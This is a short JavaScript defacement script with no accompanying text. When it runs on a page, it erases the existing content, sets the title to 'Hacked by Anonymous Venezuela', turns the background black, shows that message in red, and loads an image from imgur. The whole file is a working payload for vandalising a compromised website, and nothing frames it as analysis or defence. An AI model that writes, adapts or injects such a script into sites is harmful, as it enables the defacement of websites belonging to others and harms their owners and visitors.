var title = "Hacked by Anonymous Venezuela";
var bgcolor = "#000000";
var image_url = "http://i.imgur.com/9xQn6B8.png";
var text = "<p>Hacked by Anonymous Venezuela</p>"; 
var font_color = "#FF0000";


deface(title, bgcolor, image_url, text, font_color);
 
function deface(pageTitle, bgColor, imageUrl, pageText, fontColor) {
  document.title = pageTitle;
  document.body.innerHTML = '';
  document.bgColor = bgColor;
  var overLay = document.createElement("div");
  overLay.style.textAlign = 'center';
  document.body.appendChild(overLay);
  var txt = document.createElement("p");
  txt.style.font = 'normal normal bold 36px Verdana';
  txt.style.color = fontColor;
  txt.innerHTML = pageText;
  overLay.appendChild(txt);
 
  if (image_url != "") {
    var newImg = document.createElement("img");
    newImg.setAttribute("border", '0');
    newImg.setAttribute("src", imageUrl);
    overLay.appendChild(newImg);
  }
 
  var footer = document.createElement("p");
  footer.style.font = 'italic normal normal 12px Arial';
  footer.style.color = '#DDDDDD';
  footer.innerHTML = title;
  overLay.appendChild(footer);
}